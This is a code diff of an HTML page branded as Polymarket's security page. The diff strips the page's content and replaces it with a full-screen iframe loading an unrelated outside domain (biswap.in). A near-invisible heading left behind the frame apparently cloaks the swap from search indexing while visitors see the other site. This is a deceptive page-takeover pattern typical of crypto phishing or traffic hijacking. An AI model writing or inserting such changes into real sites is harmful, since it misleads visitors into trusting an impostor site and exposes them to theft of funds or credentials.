@@ -553,53 +553,19 @@ a.inline:hover {
 }
   </script>
 </head>
-<body>
-  <header class="topbar">
-    <a class="brand" href="../" aria-label="Polymarket">
-      <img src="../favicon.png" width="30" height="30" alt="">
-      <span>Polymarket</span>
-    </a>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="../how-it-works/" >How it works</a>
-      <a href="../faq/" >FAQ</a>
-      <a href="../about/" >About</a>
-      <a href="../security/" class="active">Security</a>
-      <a href="../supported-chains/" >Supported Chains</a>
-    </nav>
-    <span class="spacer"></span>
-    <a class="open-app" href="../dashboard/" rel="noopener noreferrer">Open app</a>
-  </header>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <main class="satellite-container">
-    <nav class="breadcrumb" aria-label="Breadcrumb">
-      <a href="../">Home</a> › <span>Cryptographic Security & System Audits</span>
-    </nav>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-    <h1 class="satellite-title">Cryptographic Security & System Audits</h1>
-    <p class="satellite-lead">Evaluating smart contract safety, price oracles, and custody models of Polymarket.</p>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Cryptographic Security & System Audits
+  </h1>
 
-    
-    <div class="section-block">
-      <h2>Security Auditing</h2>
-      <p>The smart contracts are audited by professional security teams to verify code integrity and prevent deposit vulnerabilities, cataloged on the <a class="inline" href="https://www.certik.com/" target="_blank" rel="noopener noreferrer">CertiK audit data</a> database.</p>
-    </div>
-    <div class="section-block">
-      <h2>Oracle Price Protection</h2>
-      <p>The platform integrates decentralized price feed networks to ensure transactions are executed at fair market rates, protecting user pools from price manipulation.</p>
-    </div>
-    <div class="section-block">
-      <h2>Non-Custodial Security</h2>
-      <p>The application uses peer-reviewed smart contracts. Your assets are secured by cryptography, meaning they cannot be accessed by third-party protocols, conforming to the <a class="inline" href="https://en.wikipedia.org/wiki/Cryptography" target="_blank" rel="noopener noreferrer">cryptographic systems</a> page.</p>
-    </div>
-
-    <div style="margin: 40px 0; display: flex; justify-content: flex-start;">
-      <a class="open-app" href="../dashboard/" style="max-width: 320px; display: inline-flex; justify-content: center; text-decoration: none; padding: 12px 24px; font-weight: 700;">Open Polymarket Portal</a>
-    </div>
-
-    <a class="back-cta" href="../">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="16" height="16"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
-      Back to Portal
-    </a>
-  </main>
 </body>
 </html>
